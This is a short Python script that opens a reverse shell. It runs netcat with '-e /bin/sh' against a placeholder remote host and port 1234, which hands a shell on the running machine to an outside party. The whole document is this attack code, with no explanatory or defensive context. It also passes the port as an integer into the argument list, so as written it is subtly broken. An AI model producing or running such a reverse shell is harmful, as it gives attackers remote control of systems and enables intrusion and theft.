import subprocess


host = "your.remote.host"
port = 1234
subprocess.call(["nc", host, port, "-e", "/bin/sh"])
